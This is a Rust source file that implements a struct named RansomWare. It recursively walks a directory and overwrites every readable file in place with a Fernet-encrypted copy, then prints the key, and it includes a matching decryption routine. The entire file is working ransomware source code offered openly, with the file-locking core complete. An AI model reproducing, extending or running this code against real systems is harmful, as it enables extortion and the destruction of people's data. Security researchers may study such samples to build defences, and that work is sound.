use fernet::Fernet;
use std::{fs::{read_dir, OpenOptions}, io::{Read}, os::unix::prelude::FileExt};
use crate::crypt;

pub struct RansomWare {
    path: String,
    key: String,
    fernet: Fernet
}

impl RansomWare {
    pub fn new(path: String, mut key: String) -> Self {
        if key.len() < 32 {
            key = Fernet::generate_key();
        }
        Self {
            path,
            fernet: Fernet::new(&key).unwrap(),
            key,
        }
    }

    fn encrypt_file(&mut self, path: String) {
        if let Ok(mut f) = OpenOptions::new().read(true).write(true).open(&path) {
            let mut buf: Vec<u8> = vec![];
            if let Ok(_) = f.read_to_end(&mut buf) {
                let encrypted = crypt::encrypt(&mut self.fernet, buf);
                f.write_all_at(encrypted.as_bytes(), 0).ok();
            }
        }else {
            println!("an error occured while encrypting a file. {path}");
        }
    }
    fn encrypt_dir(&mut self, path: String) {
        //we dont need to do any sort of error handling, if we cant read, we cant read
        if let Ok(dir) = read_dir(&path) {
            for file in dir {
                if file.is_err() {
                    continue;
                }
                let file = file.unwrap();
                if let Ok(metadata) = file.metadata() {
                    if metadata.is_dir() {
                        self.encrypt_dir(file.path().into_os_string().into_string().unwrap());
                    }else if metadata.is_file() {
                        self.encrypt_file(file.path().into_os_string().into_string().unwrap());
                    }
                }
            }
        }else {
            println!("an error occured while encrypting dir. {path}");
        }
    }

    fn decrypt_file(&mut self, path: String) {
        if let Ok(mut f) = OpenOptions::new().read(true).write(true).open(&path) {
            let mut buf: Vec<u8> = vec![];
            if let Ok(_) = f.read_to_end(&mut buf) {
                if let Ok(encrypted) = crypt::decrypt(&mut self.fernet, String::from_utf8(buf).unwrap()) {
                    f.set_len(0).unwrap();
                    f.write_all_at(&encrypted, 0).ok();
                }else {
                    println!("could not decrypt file {path}");
                }
            }
        }else {
            println!("an error occured while decrypting a file. {path}");
        }
    }
    fn decrypt_dir(&mut self, path: String) {
        //we dont need to any sort of error handling, if we cant read, we cant read
        if let Ok(dir) = read_dir(&path) {
            for file in dir {
                if file.is_err() {
                    continue;
                }
                let file = file.unwrap();
                if let Ok(metadata) = file.metadata() {
                    if metadata.is_dir() {
                        self.decrypt_dir(file.path().into_os_string().into_string().unwrap());
                    }else if metadata.is_file() {
                        self.decrypt_file(file.path().into_os_string().into_string().unwrap());
                    }
                }
            }
        }else {
            println!("an error occured while decrypting dir. {path}");
        }
    }



    pub fn encrypt(&mut self) {
        self.encrypt_dir(self.path.clone());
        println!("KEY USED: {}", self.key);
    }
    pub fn decrypt(&mut self) {
        self.decrypt_dir(self.path.clone());
    }
}
